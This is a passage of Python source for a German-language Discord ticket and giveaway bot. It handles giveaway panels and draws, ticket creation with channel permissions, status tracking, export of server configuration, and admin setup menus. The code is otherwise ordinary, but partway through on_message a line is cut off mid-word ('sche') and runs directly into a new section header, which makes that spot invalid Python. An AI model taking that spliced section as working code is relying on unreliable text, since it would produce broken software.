        super().__init__(timeout=None)
        gw = _giveaways.get(gw_id)
        if not gw:
            container = ui.Container(accent_color=discord.Color.dark_grey())
            container.add_item(ui.TextDisplay("## Giveaway nicht gefunden"))
            self.add_item(container)
            return

        accent = discord.Color.gold() if not gw["ended"] else discord.Color.dark_grey()
        container = ui.Container(accent_color=accent)
        desc_block = f"\n\n{gw['description']}\n" if gw.get("description") else ""
        participants_count = len(gw["participants"])
        uid = user.id if user is not None else 0
        user_joined = uid in gw["participants"]

        if not gw["ended"]:
            timestamp_discord = f"<t:{int(gw['end_time'])}:R>"
            container.add_item(
                ui.TextDisplay(
                    "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨\n"
                    f"## 🎉 GIVEAWAY: {gw['prize']}\n"
                    f"{desc_block}\n"
                    f"> **Gewinner-Plätze:** {gw['winners']}\n"
                    f"> **Teilnehmer:** {participants_count}\n"
                    f"> **Endet:** {timestamp_discord}\n"
                    f"> **Dein Status:** {'✅ Angemeldet' if user_joined else '❌ Nicht angemeldet'}\n\n"
                    "Klicke unten, um deine Teilnahme zu ändern:\n"
                    "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨"
                )
            )
            container.add_item(ui.Separator())
            row = ui.ActionRow()
            row.add_item(GiveawayJoinButton(gw_id, user_joined))
            container.add_item(row)
        else:
            container.add_item(
                ui.TextDisplay(
                    "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨\n"
                    f"## 🎉 GIVEAWAY BEENDET: {gw['prize']}\n"
                    f"{desc_block}\n"
                    f"> **Gewinner:** {gw.get('winner_text') or '*niemand*'}\n"
                    f"> **Teilnehmer gesamt:** {participants_count}\n"
                    "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨"
                )
            )
            container.add_item(ui.Separator())
            row = ui.ActionRow()
            row.add_item(GiveawayRerollButton(gw_id))
            container.add_item(row)

        self.add_item(container)


def _giveaway_select_options() -> list[discord.SelectOption]:
    """Live-Optionen für Giveaway-Dropdown (immer aktuell)."""
    options: list[discord.SelectOption] = []
    active_gws = [gw_id for gw_id, data in _giveaways.items() if not data.get("ended")]
    if not active_gws:
        options.append(
            discord.SelectOption(
                label="Keine aktiven Giveaways",
                description="Derzeit läuft kein Gewinnspiel.",
                value="none",
            )
        )
    else:
        # neueste zuerst
        def _end(gid: str) -> float:
            try:
                return float(_giveaways[gid].get("end_time") or 0)
            except Exception:
                return 0.0
        for gw_id in sorted(active_gws, key=_end, reverse=True)[:25]:
            gw = _giveaways[gw_id]
            options.append(
                discord.SelectOption(
                    label=str(gw["prize"])[:100],
                    description=f"Gewinner: {gw['winners']} | Teilnehmer: {len(gw['participants'])}"[:100],
                    value=gw_id,
                    emoji="🎉",
                )
            )
    return options


class GiveawaySelect(ui.Select):
    def __init__(self):
        super().__init__(
            placeholder="🎉 Wähle ein aktives Giveaway…",
            min_values=1,
            max_values=1,
            options=_giveaway_select_options(),
            custom_id="giveaway_select",
        )

    async def callback(self, interaction: discord.Interaction):
        # Optionen live halten (persistentes Panel kann veraltet sein)
        try:
            self.options = _giveaway_select_options()
        except Exception:
            pass

        gw_id = self.values[0]
        if gw_id == "none":
            await deny_v2(
                interaction,
                action="Giveaway",
                reason="Aktuell gibt es **keine** offenen Giveaways.",
                fix="Später erneut schauen oder Admin: `/giveaway` erstellen.",
                accent=discord.Color.orange(),
            )
            # Panel-Message mit frischen Optionen updaten falls möglich
            try:
                if interaction.message:
                    await interaction.message.edit(view=GiveawayPanelLayout())
            except discord.HTTPException:
                pass
            return

        if gw_id not in _giveaways or _giveaways[gw_id].get("ended"):
            await deny_v2(
                interaction,
                action="Giveaway",
                reason="Dieses Giveaway ist **beendet** oder existiert nicht mehr.",
                fix="Panel neu öffnen: anderes Giveaway wählen oder `/giveawaypanel`.",
                accent=discord.Color.orange(),
            )
            try:
                if interaction.message:
                    await interaction.message.edit(view=GiveawayPanelLayout())
            except discord.HTTPException:
                pass
            return

        await reply_v2(
            interaction,
            GiveawayTicketLayout(gw_id, interaction.user),
            ephemeral=True,
        )
        # Parent-Panel Optionen refreshen
        try:
            if interaction.message:
                await interaction.message.edit(view=GiveawayPanelLayout())
        except discord.HTTPException:
            pass


class GiveawayPanelLayout(ui.LayoutView):
    def __init__(self):
        super().__init__(timeout=None)
        container = ui.Container(accent_color=discord.Color.gold())
        container.add_item(
            ui.TextDisplay(
                "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨\n"
                "### ★  G I V E A W A Y   P A N E L  ★\n"
                "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨\n\n"
                "Möchtest du an einem aktuellen Gewinnspiel teilnehmen?\n"
                "Wähle im Menü das Giveaway aus, um beizutreten oder die Teilnahme zu verwalten!\n\n"
                "> • Button: Teilnahme eintragen / zurückziehen\n"
                "> • Nach Ablauf lost der Bot automatisch aus\n"
                "> • Gewinner: Ticket **Giveaway Claim** öffnen\n\n"
                "✨ 🌌 *✦* 🌠 *✦* 🌌 ✨\n\n"
                f"-# {BRAND_FOOTER}"
            )
        )
        container.add_item(ui.Separator())
        row = ui.ActionRow()
        row.add_item(GiveawaySelect())
        container.add_item(row)
        self.add_item(container)


def start_giveaway_runner(gw_id: str) -> None:
    """Startet den Giveaway-Timer nur einmal pro ID."""
    t = _giveaway_tasks.get(gw_id)
    if t is not None and not t.done():
        return
    _giveaway_tasks[gw_id] = asyncio.create_task(
        background_giveaway_runner(gw_id),
        name=f"giveaway-{gw_id}",
    )


async def background_giveaway_runner(gw_id: str) -> None:
    try:
        await _background_giveaway_runner_inner(gw_id)
    finally:
        _giveaway_tasks.pop(gw_id, None)


async def _background_giveaway_runner_inner(gw_id: str) -> None:
    while True:
        gw = _giveaways.get(gw_id)
        if not gw or gw.get("ended"):
            break
        now = datetime.datetime.now(datetime.timezone.utc).timestamp()
        remaining = float(gw["end_time"]) - now
        if remaining <= 0:
            gw["ended"] = True
            participants = gw["participants"]
            if not participants:
                gw["winner_text"] = "Niemand (Keine Teilnehmer)"
            else:
                count = min(int(gw["winners"]), len(participants))
                winners = random.sample(list(participants), count)
                gw["winner_text"] = ", ".join(f"<@{uid}>" for uid in winners)
            schedule_save()

            try:
                guild_id = int(str(gw_id).split("_")[0])
            except (ValueError, IndexError):
                guild_id = 0
            guild = bot.get_guild(guild_id)
            if guild:
                channel = guild.get_channel(int(gw["channel_id"]))
                if channel is not None:
                    try:
                        await channel_v2(
                            channel,
                            InfoLayout(
                                title="🎉 Giveaway beendet!",
                                body=(
                                    f"Das Gewinnspiel für **{gw['prize']}** ist abgelaufen!\n\n"
                                    f"> **Gewinner:** {gw['winner_text']}\n\n"
                                    "Bitte öffne ein Ticket unter **Giveaway Claim**, "
                                    "um deinen Preis einzulösen!"
                                ),
                                accent=discord.Color.gold(),
                                footer=now_str(),
                            ),
                        )
                    except discord.HTTPException:
                        pass
                    await audit_log(
                        guild,
                        title="🎉 Audit · Giveaway beendet",
                        body=(
                            f"> **Preis:** {gw['prize']}\n"
                            f"> **Gewinner:** {gw['winner_text']}\n"
                            f"> **Teilnehmer:** {len(participants)}"
                        ),
                        accent=discord.Color.gold(),
                    )
            break
        await asyncio.sleep(min(max(remaining, 1), 15))


class TicketCategorySelect(ui.Select):
    def __init__(self, hide_bewerbung: bool = False):
        options = [
            discord.SelectOption(
                label="Support",
                description="Allgemeine Fragen & Hilfe",
                emoji="❓",
                value="support",
            ),
            discord.SelectOption(
                label="Beschwerde",
                description="Meldungen & Vorfälle",
                emoji="⚠️",
                value="beschwerde",
            ),
            discord.SelectOption(
                label="Giveaway Claim",
                description="Gewonnene Giveaways abholen",
                emoji="🎉",
                value="giveaway",
            ),
        ]
        if not hide_bewerbung:
            options.append(
                discord.SelectOption(
                    label="Bewerbung",
                    description="Team-Bewerbung (Formular)",
                    emoji="📝",
                    value="bewerbung",
                )
            )
        super().__init__(
            placeholder="Wähle eine Ticket-Kategorie…",
            min_values=1,
            max_values=1,
            options=options,
            custom_id="ticket_cat_select",
        )

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        user = interaction.user
        if guild is None:
            await deny_v2(
                interaction,
                action="Ticket erstellen",
                reason="Tickets können nur **auf einem Server** erstellt werden.",
                fix="Nutze das Panel im Support-Kanal.",
            )
            return
        if await _deny_if_cooldown(interaction, "create", action="Ticket erstellen"):
            return
        if is_blacklisted(user, guild):
            await deny_v2(
                interaction,
                action="Ticket erstellen",
                reason="Du stehst auf der **Ticket-Blacklist** dieses Servers.",
                fix="Melde dich bei einem Admin (`/ticketban` zum Entsperren).",
                title="🚫 Gesperrt",
            )
            return

        # Bewerbung = Modal (muss VOR defer kommen)
        if self.values and self.values[0] == "bewerbung":
            try:
                await interaction.response.send_modal(ApplicationModal())
            except discord.HTTPException as e:
                await deny_v2(
                    interaction,
                    action="Bewerbung",
                    reason="Formular konnte nicht geöffnet werden.",
                    fix="Erneut Bewerbung im Panel wählen.",
                    details=f"> `{e}`",
                )
            return
        cd = check_create_cooldown(user.id)
        if cd is not None:
            await deny_v2(
                interaction,
                action="Ticket erstellen",
                reason=f"Cooldown — noch **{cd:.0f}s** bis zum nächsten Ticket.",
                fix="Kurz warten, dann erneut eine Kategorie wählen.",
                accent=discord.Color.orange(),
                title="⏳ Cooldown",
            )
            return

        lock = _create_locks[user.id]
        if lock.locked():
            await deny_v2(
                interaction,
                action="Ticket erstellen",
                reason="Dein Ticket wird **gerade erstellt** (Doppelklick-Schutz).",
                fix="Einen Moment warten.",
                accent=discord.Color.orange(),
                title="⏳ Bitte warten",
            )
            return

        async with lock:
            open_t = user_open_tickets(user.id, guild)
            if len(open_t) >= MAX_TICKETS_PER_USER:
                mentions = ", ".join(ch.mention for ch in open_t[:5])
                await deny_v2(
                    interaction,
                    action="Ticket erstellen",
                    reason=f"Du hast bereits **{len(open_t)}** offenes Ticket (Maximum: {MAX_TICKETS_PER_USER}).",
                    fix="Schließe zuerst dein altes Ticket (Button **Schließen**).",
                    details=f"> Offene Tickets: {mentions}",
                    accent=discord.Color.orange(),
                    title="📂 Ticket bereits offen",
                )
                return

            try:
                if not interaction.response.is_done():
                    await interaction.response.defer(ephemeral=True)
            except discord.HTTPException:
                pass

            topic_type = self.values[0] if self.values[0] in CAT_LABELS else "support"

            # Bot-Rechte vorab prüfen
            me = guild.me
            if me is not None:
                missing = []
                if not me.guild_permissions.manage_channels:
                    missing.append("Kanäle verwalten")
                if not me.guild_permissions.view_channel:
                    missing.append("Kanäle ansehen")
                if missing:
                    await deny_v2(
                        interaction,
                        action="Ticket erstellen",
                        reason="Dem Bot fehlen wichtige Server-Rechte.",
                        fix="Admin: Bot-Rolle die fehlenden Rechte geben.",
                        details="> Fehlt: " + ", ".join(f"**{m}**" for m in missing),
                        title="⚠️ Bot-Rechte fehlen",
                    )
                    return

            try:
                category = await get_or_create_category(guild)
                staff_roles = await get_staff_roles(guild)
            except discord.HTTPException as e:
                await deny_v2(
                    interaction,
                    action="Ticket erstellen",
                    reason="Kategorie oder Staff-Rollen konnten nicht geladen/erstellt werden.",
                    fix="Bot-Rechte & Rollen-Hierarchie prüfen.",
                    details=f"> `{type(e).__name__}: {e}`",
                )
                return

            channel_name = safe_channel_name(CAT_PREFIX[topic_type], user.name)
            overwrites: dict = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                user: discord.PermissionOverwrite(
                    view_channel=True,
                    send_messages=True,
                    attach_files=True,
                    read_message_history=True,
                ),
                guild.me: discord.PermissionOverwrite(
                    view_channel=True,
                    send_messages=True,
                    manage_channels=True,
                    manage_permissions=True,
                    read_message_history=True,
                    attach_files=True,
                ),
            }
            overwrites.update(staff_overwrites(staff_roles, send_messages=True))

            try:
                channel = await with_retry(
                    lambda: guild.create_text_channel(
                        name=channel_name,
                        category=category,
                        overwrites=overwrites,
                        topic=f"owner:{user.id} cat:{topic_type}",
                        reason=f"Ticket von {user} ({user.id})",
                    ),
                    label="create_channel",
                )
            except discord.HTTPException as e:
                await deny_v2(
                    interaction,
                    action="Ticket erstellen",
                    reason="Discord hat die Kanal-Erstellung abgelehnt.",
                    fix="Rechte **Kanäle verwalten** + Kategorie-Zugriff für den Bot prüfen.",
                    details=f"> `{type(e).__name__}: {e}`",
                )
                return

            register_ticket(channel.id, user.id, category=topic_type, guild_id=guild.id)
            mark_create(user.id)

            label = CAT_LABELS[topic_type]
            emoji = CAT_EMOJI.get(topic_type, "🎟️")
            meta = _ticket_meta.get(channel.id, {"status": STATUS_OPEN, "category": topic_type})

            control = await channel_v2(
                channel,
                TicketControlLayout(
                    title=f"{emoji} Ticket ({label}) — {user.display_name}",
                    meta=meta,
                    owner_mention=user.mention,
                    extra=(
                        f"Willkommen {user.mention}! 👋\n\n"
                        "**Bitte beschreibe dein Anliegen genau.**\n"
                        "Ein Teammitglied meldet sich in Kürze.\n\n"
                        f"> **Staff:** {staff_role_mentions(staff_roles)}\n\n"
                        "**Tipps**\n"
                        "> • Was ist passiert?\n"
                        "> • Seit wann?\n"
                        "> • Screenshots helfen"
                    ),
                ),
            )
            if control:
                set_control_message(channel.id, control.id)

            if staff_roles:
                await channel_v2(
                    channel,
                    InfoLayout(
                        title="🔔 Staff-Ping",
                        body=(
                            f"Neues **{label}**-Ticket von {user.mention}.\n\n"
                            f"> {staff_role_mentions(staff_roles)}\n\n"
                            f"{build_status_bar(STATUS_OPEN)}"
                        ),
                        accent=discord.Color.purple(),
                    ),
                    allowed_mentions=discord.AllowedMentions(roles=True, users=False, everyone=False),
                )

            await reply_v2(
                interaction,
                InfoLayout(
                    title="✅ Ticket erstellt",
                    body=(
                        f"> 🎟️ {channel.mention}\n"
                        f"> **Kategorie:** {label}\n\n"
                        f"{build_status_bar(STATUS_OPEN)}"
                    ),
                    accent=discord.Color.green(),
                ),
                ephemeral=True,
            )

            await audit_log(
                guild,
                title="🎟️ Audit · Ticket erstellt",
                body=(
                    f"> **Kanal:** {channel.mention} (`{channel.name}`)\n"
                    f"> **User:** {user.mention} (`{user.id}`)\n"
                    f"> **Kategorie:** {label}\n"
                    f"> **Status:** {build_status_bar(STATUS_OPEN)}"
                ),
                accent=discord.Color.blue(),
            )


# =========================================================
#  MESSAGE TRACKING → Live-Status
#  Staff schreibt (geclaimt)  → "Wartet auf User"
#  User antwortet (waiting)   → zurück "Geclaimt"
# =========================================================

@bot.event
async def on_message(message: discord.Message):
    # Wenn Funktionen deaktiviert: keine Status-Updates / kein Feature-Ping
    # (Commands bereits über global_prefix_check blockiert)
    if not is_bot_functions_enabled() and bot.user and not message.author.bot:
        # optional: bei reinem Ping trotzdem Disable-Hinweis
        if bot.user in getattr(message, "mentions", []):
            cleaned = message.content.replace(f"<@{bot.user.id}>", "").replace(f"<@!{bot.user.id}>", "").strip()
            if len(cleaned) <= 2:
                try:
                    await channel_v2(message.channel, disabled_layout())
                except Exception:
                    pass
        await bot.process_commands(message)
        return

    # Bot-Ping: kurze Vorstellung (V2) — nur direkter Ping, keine Reply-Mentions/Commands
    if (
        bot.user
        and not message.author.bot
        and not message.mention_everyone
        and bot.user in message.mentions  # echte Mention, nicht nur reply ping
        and not (message.reference and not message.content)  # pure reply ohne text skip already
    ):
        cleaned = message.content
        cleaned = cleaned.replace(f"<@{bot.user.id}>", "")
        cleaned = cleaned.replace(f"<@!{bot.user.id}>", "")
        # andere mentions entfernen
        for m in message.mentions:
            cleaned = cleaned.replace(f"<@{m.id}>", "").replace(f"<@!{m.id}>", "")
        cleaned = cleaned.strip()
        # nur fast-leerer Ping, kein Command
        if len(cleaned) <= 2 and not cleaned.startswith(("!", "/")) and message.type == discord.MessageType.default:
            try:
                await channel_v2(
                    message.channel,
                    InfoLayout(
                        title=f"Hey, ich bin {bot.user.display_name}! 👋",
                        body=(
                            f"Ich bin der **Ticket- & Community-Bot**.\n\n"
                            f"**Das kann ich**\n"
                            f"> 🎟️ Tickets öffnen & verwalten (Claim, Close, Forward, …)\n"
                            f"> 📝 Bewerbungen mit Formular\n"
                            f"> 🎉 Giveaways\n"
                            f"> ⭐ Bewertungen, Scores & HTML-Transkripte\n"
                            f"> 📊 Live-Status-Leiste + Audit-Log\n\n"
                            f"**Schnellstart**\n"
                            f"> Tippe `/help` für das komplette Menü\n"
                            f"> Admins: `/panel` · `/giveawaypanel` · `/staff`\n\n"
                            f"**Credits**\n"
                            f"> Powered by **{BRAND_NAME}**\n"
                            f"> build by **{BRAND_BUILDER}**"
                        ),
                        accent=discord.Color.blurple(),
                    ),
                )
            except discord.HTTPException:
                pass

    await bot.process_commands(message)

    if message.author.bot or not message.guild:
        return
    if not isinstance(message.channel, discord.TextChannel):
        return
    if message.channel.id not in _ticket_owners:
        return

    meta = _ticket_meta.get(message.channel.id)
    if not meta:
        return

    status = str(meta.get("status") or STATUS_OPEN)
    if status == STATUS_CLOSING:
        return

    owner_id = _ticket_owners.get(message.channel.id)
    staff_msg = is_staff(message.author, message.guild)
    user_msg = owner_id is not None and message.author.id == owner_id

    if staff_msg:
        meta["last_staff_msg_at"] = iso_now()
        # Erste Staff-Antwort stoppt den Response-Timer (falls noch nicht beim Claim)
        if not meta.get("first_response_at"):
            created = parse_iso(meta.get("created_at"))
            if created:
                delta = (utcnow() - created).total_seconds()
                meta["first_response_at"] = iso_now()
                _response_times.setdefault(message.guild.id, []).append(delta)
                _response_times[message.guild.id] = _response_times[message.guild.id][-200:]
        # Nach Claim: Staff-Nachricht = wartet auf User
        if status == STATUS_CLAIMED:
            meta["status"] = STATUS_WAITING
            schedule_save()
            try:
                await refresh_control_message(
                    message.channel,
                    extra="**Update**\n> Staff wartet auf Antwort → **Wartet auf User**",
                )
            except Exception:
                pass
            return
        schedule_save()
        return

    if user_msg:
        meta["last_user_msg_at"] = iso_now()
        # User hat geantwortet → wieder Geclaimt
        if status == STATUS_WAITING:
            meta["status"] = STATUS_CLAIMED
            schedule_save()
            try:
                await refresh_control_message(
                    message.channel,
                    extra="**Update**\n> User hat geantwortet → **Geclaimt**",
                )
            except Exception:
                pass
            return
        sche# =========================================================
#  EVENTS & COMMANDS (Slash / + Prefix-Alias)
# =========================================================


def _guild_open_tickets(guild: discord.Guild) -> list[tuple[discord.abc.GuildChannel, dict[str, Any], int | None, int | None]]:
    """Offene Tickets dieses Servers: (channel, meta, owner_id, claimer_id)."""
    rows: list[tuple[discord.abc.GuildChannel, dict[str, Any], int | None, int | None]] = []
    for ch_id, owner_id in list(_ticket_owners.items()):
        ch = guild.get_channel(ch_id)
        if ch is None:
            continue
        meta = _ticket_meta.get(ch_id, {}) or {}
        claimer = meta.get("claimer_id") or _ticket_claimers.get(ch_id)
        rows.append((ch, meta, owner_id, int(claimer) if claimer else None))
    # älteste zuerst
    def _created(item):
        meta = item[1]
        dt = parse_iso(meta.get("created_at"))
        return dt or utcnow()
    rows.sort(key=_created)
    return rows


def tickets_layout(guild: discord.Guild) -> InfoLayout:
    rows = _guild_open_tickets(guild)
    if not rows:
        return InfoLayout(
            title="🎟️ Offene Tickets",
            body=(
                "Aktuell sind **keine** Tickets offen.\n\n"
                "> Gut gemacht — Queue ist leer.\n"
                "> Neue Tickets kommen über `/panel`."
            ),
            accent=discord.Color.green(),
        )

    lines: list[str] = []
    for i, (ch, meta, owner_id, claimer_id) in enumerate(rows[:25], 1):
        status = str(meta.get("status") or STATUS_OPEN)
        st_emoji = STATUS_EMOJI.get(status, "⚪")
        st_label = STATUS_LABELS.get(status, status)
        cat = CAT_LABELS.get(str(meta.get("category", "support")), "Support")
        cat_e = CAT_EMOJI.get(str(meta.get("category", "support")), "🎟️")
        created = parse_iso(meta.get("created_at"))
        age = fmt_duration((utcnow() - created).total_seconds()) if created else "—"
        owner_m = f"<@{owner_id}>" if owner_id else "?"
        if claimer_id:
            claim_txt = f"<@{claimer_id}> · {claim_age_text(meta)}"
        else:
            claim_txt = "*frei*"
        lines.append(
            f"> `{i}.` {ch.mention} · {cat_e} **{cat}**\n"
            f"> {st_emoji} **{st_label}** · ⏱ {age}\n"
            f"> 👤 {owner_m} · ✋ {claim_txt}"
        )

    more = ""
    if len(rows) > 25:
        more = f"\n\n-# … und **{len(rows) - 25}** weitere"

    # Kurz-Stats
    by_status: dict[str, int] = {}
    for _, meta, _, _ in rows:
        st = str(meta.get("status") or STATUS_OPEN)
        by_status[st] = by_status.get(st, 0) + 1
    stat_bits = " · ".join(
        f"{STATUS_EMOJI.get(k, '•')} {STATUS_LABELS.get(k, k)} `{v}`"
        for k, v in by_status.items()
    )

    return InfoLayout(
        title=f"🎟️ Offene Tickets ({len(rows)})",
        body=(
            f"**Übersicht**\n> {stat_bits}\n\n"
            + "\n\n".join(lines)
            + more
            + "\n\n**Tipp**\n> Klicke den Kanal-Link, um direkt reinzugehen."
        ),
        accent=discord.Color.blurple(),
    )


def botstatus_layout(guild: discord.Guild | None = None) -> InfoLayout:
    latency_ms = round(bot.latency * 1000) if bot.latency is not None else -1
    if latency_ms < 0:
        ping_txt = "*noch nicht bereit*"
    elif latency_ms < 150:
        ping_txt = f"**{latency_ms} ms** · gut"
    elif latency_ms < 300:
        ping_txt = f"**{latency_ms} ms** · okay"
    else:
        ping_txt = f"**{latency_ms} ms** · hoch"

    open_global = len(_ticket_owners)
    open_guild = 0
    if guild is not None:
        open_guild = len(_guild_open_tickets(guild))

    active_gw = sum(1 for g in _giveaways.values() if not g.get("ended"))
    ended_gw = sum(1 for g in _giveaways.values() if g.get("ended"))
    running_tasks = sum(1 for t in _giveaway_tasks.values() if t is not None and not t.done())

    # errors last hour
    cutoff = utcnow().timestamp() - 3600
    recent = []
    for e in _recent_errors:
        dt = parse_iso(e.get("at"))
        if dt and dt.timestamp() >= cutoff:
            recent.append(e)
    # fallback: show last few even if older
    show = list(reversed(recent[-8:])) if recent else list(reversed(_recent_errors[-5:]))

    if show:
        err_lines = []
        for e in show:
            dt = parse_iso(e.get("at"))
            when = dt.strftime("%H:%M:%S") if dt else "?"
            err_lines.append(f"> `{when}` **{e.get('kind','?')}** — {e.get('message','')[:120]}")
        err_block = "\n".join(err_lines)
    else:
        err_block = "> *Keine Warnungen/Fehler in der letzten Stunde* ✅"

    guild_line = ""
    if guild is not None:
        staff_n = len(get_staff_role_ids(guild.id))
        rating = get_rating_channel_id(guild.id)
        log_ch = get_log_channel_id(guild.id)
        bl = get_blacklist_role_id(guild.id)
        guild_line = (
            f"\n**Dieser Server**\n"
            f"> Offene Tickets: **{open_guild}**\n"
            f"> Staff-Rollen konfiguriert: **{staff_n}**\n"
            f"> Bewertungen: {f'<#{rating}>' if rating else '*nicht gesetzt*'}\n"
            f"> Log: {f'<#{log_ch}>' if log_ch else '*nicht gesetzt*'}\n"
            f"> Blacklist-Rolle: {f'<@&{bl}>' if bl else '*nicht gesetzt*'}\n"
        )

    return InfoLayout(
        title="🩺 Bot-Status",
        body=(
            f"**Verbindung**\n"
            f"> WebSocket-Ping: {ping_txt}\n"
            f"> Guilds: **{len(bot.guilds)}** · User-Cache: **{len(bot.users)}**\n\n"
            f"**Tickets**\n"
            f"> Offen (global): **{open_global}**\n"
            f"> Erstellt gesamt: `{_stats.get('total_created', 0)}` · Geschlossen: `{_stats.get('total_closed', 0)}`\n\n"
            f"**Giveaways**\n"
            f"> Aktiv: **{active_gw}** · Beendet gespeichert: **{ended_gw}**\n"
            f"> Laufende Timer-Tasks: **{running_tasks}**\n"
            f"{guild_line}\n"
            f"**Fehler / Warnungen (letzte Stunde)**\n"
            f"{err_block}\n\n"
            f"> Details: `/tickets` · Config: `/export` · Setup: `/setup`"
        ),
        accent=discord.Color.green() if latency_ms < 300 and not recent else discord.Color.orange(),
    )


def build_export_payload(guild: discord.Guild) -> dict[str, Any]:
    """Config-Export für einen Server (ohne Token)."""
    staff_ids = get_staff_role_ids(guild.id)
    open_rows = _guild_open_tickets(guild)
    active_gw = [
        {
            "id": gid,
            "prize": g.get("prize"),
            "winners": g.get("winners"),
            "end_time": g.get("end_time"),
            "ended": g.get("ended"),
            "participants": len(g.get("participants") or []),
            "channel_id": g.get("channel_id"),
        }
        for gid, g in _giveaways.items()
        if str(gid).startswith(str(guild.id))
    ]
    return {
        "exported_at": iso_now(),
        "guild": {"id": guild.id, "name": guild.name},
        "brand": BRAND_FOOTER,
        "config": {
            "staff_role_ids": staff_ids,
            "staff_role_names": [getattr(guild.get_role(r), "name", str(r)) for r in staff_ids],
            "rating_channel_id": get_rating_channel_id(guild.id),
            "log_channel_id": get_log_channel_id(guild.id),
            "blacklist_role_id": get_blacklist_role_id(guild.id),
            "category_name": CATEGORY_NAME,
        },
        "stats": {
            "global": dict(_stats),
            "open_tickets_guild": len(open_rows),
            "ratings_count": len(_ratings.get(guild.id) or []),
            "avg_stars": guild_avg_stars(guild.id),
            "today_created": guild_today_created(guild.id),
            "avg_response_minutes": guild_avg_response_minutes(guild.id),
            "blacklist_users": len(_blacklisted_users),
        },
        "open_tickets": [
            {
                "channel_id": ch.id,
                "channel_name": getattr(ch, "name", str(ch.id)),
                "owner_id": owner_id,
                "claimer_id": claimer_id,
                "status": (meta or {}).get("status"),
                "category": (meta or {}).get("category"),
                "created_at": (meta or {}).get("created_at"),
            }
            for ch, meta, owner_id, claimer_id in open_rows
        ],
        "giveaways": active_gw,
        "supporter_top": [
            {"user_id": uid, **data}
            for uid, data in top_supporters(guild.id, limit=10)
        ],
    }


def setup_status_text(guild: discord.Guild) -> str:
    staff = get_staff_role_ids(guild.id)
    rating = get_rating_channel_id(guild.id)
    log_ch = get_log_channel_id(guild.id)
    bl = get_blacklist_role_id(guild.id)

    def ok(v):
        return "✅" if v else "❌"

    lines = [
        f"> {ok(staff)} **Staff-Rollen** — {staff_role_mentions([guild.get_role(i) for i in staff if guild.get_role(i)]) if staff else '*nicht gesetzt*'}",
        f"> {ok(log_ch)} **Log-Kanal** — {f'<#{log_ch}>' if log_ch else '*nicht gesetzt*'}",
        f"> {ok(rating)} **Bewertungs-Kanal** — {f'<#{rating}>' if rating else '*nicht gesetzt*'}",
        f"> {ok(bl)} **Blacklist-Rolle** — {f'<@&{bl}>' if bl else '*nicht gesetzt (Auto: Ticket-Blacklisted)*'}",
    ]
    return "\n".join(lines)


class SetupRoleSelect(ui.RoleSelect):
    def __init__(self):
        super().__init__(
            placeholder="Staff-Rollen wählen (mehrere möglich)…",
            min_values=1,
            max_values=min(10, 25),
            custom_id="setup_staff_roles",
        )

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        if guild is None:
            await deny_v2(interaction, action="Setup", reason="Nur auf einem Server.", fix="Im Server ausführen.")
            return
        if not interaction.user.guild_permissions.administrator:
            await deny_v2(interaction, action="Setup", reason="Nur **Administratoren**.", fix="Admin fragen.")
            return
        roles = list(self.values)
        view_info = await do_staff_set(guild, roles)
        try:
            await interaction.response.edit_message(view=SetupLayout(guild))
            await interaction.followup.send(view=view_info, ephemeral=True)
        except discord.HTTPException:
            if interaction.response.is_done():
                await interaction.followup.send(view=view_info, ephemeral=True)
            else:
                await interaction.response.send_message(view=view_info, ephemeral=True)


class SetupChannelSelect(ui.ChannelSelect):
    def __init__(self, kind: str, placeholder: str, custom_id: str):
        super().__init__(
            placeholder=placeholder,
            min_values=1,
            max_values=1,
            channel_types=[discord.ChannelType.text],
            custom_id=custom_id,
        )
        self.kind = kind

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        if guild is None:
            await deny_v2(interaction, action="Setup", reason="Nur auf einem Server.", fix="Im Server ausführen.")
            return
        if not interaction.user.guild_permissions.administrator:
            await deny_v2(interaction, action="Setup", reason="Nur **Administratoren**.", fix="Admin fragen.")
            return
        ch = self.values[0]
        ch_id = ch.id if hasattr(ch, "id") else int(ch)
        if self.kind == "log":
            set_log_channel(guild.id, ch_id)
            title, body = "📜 Log-Kanal gesetzt", f"> Audit & Transkripte: <#{ch_id}>"
        else:
            set_rating_channel(guild.id, ch_id)
            title, body = "⭐ Bewertungs-Kanal gesetzt", f"> Bewertungen: <#{ch_id}>"
        info = InfoLayout(title=title, body=body, accent=discord.Color.green())
        try:
            await interaction.response.edit_message(view=SetupLayout(guild))
            await interaction.followup.send(view=info, ephemeral=True)
        except discord.HTTPException:
            if interaction.response.is_done():
                await interaction.followup.send(view=info, ephemeral=True)
            else:
                await interaction.response.send_message(view=info, ephemeral=True)


class SetupBlacklistRoleSelect(ui.RoleSelect):
    def __init__(self):
        super().__init__(
            placeholder="Blacklist-Rolle wählen…",
            min_values=1,
            max_values=1,
            custom_id="setup_blacklist_role",
        )

    async def callback(self, interaction: discord.Interaction):
        guild = interaction.guild
        if guild is None:
            await deny_v2(interaction, action="Setup", reason="Nur auf einem Server.", fix="Im Server ausführen.")
            return
        if not interaction.user.guild_permissions.administrator:
            await deny_v2(interaction, action="Setup", reason="Nur **Administratoren**.", fix="Admin fragen.")
            return
        role = self.values[0]
        if role.is_default() or role.managed:
            await deny_v2(
                interaction,
                action="Setup",
                reason="@everyone/Bot-Rollen nicht erlaubt.",
                fix="Eigene Server-Rolle wählen.",
            )
            return
        set_blacklist_role(guild.id, role.id)
        msg = InfoLayout(
            title="🚫 Blacklist-Rolle gesetzt",
            body=f"> {role.mention}\n> Gesperrte User können keine Tickets/Bewerbungen öffnen.",
            accent=discord.Color.dark_red(),
        )
        try:
            await interaction.response.edit_message(view=SetupLayout(guild))
            await interaction.followup.send(view=msg, ephemeral=True)
        except discord.HTTPException:
            if interaction.response.is_done():
                await interaction.followup.send(view=msg, ephemeral=True)
            else:
                await interaction.response.send_message(view=msg, ephemeral=True)


class SetupPostPanelButton(ui.Button):
    def __init__(self):
        super().__init__(
            label="Ticket-Panel posten",
            style=discord.ButtonStyle.primary,
            emoji="📩",
            custom_id="setup_post_panel",
        )

    async def callback(self, interaction: discord.Interaction):
        if interaction.guild is None:
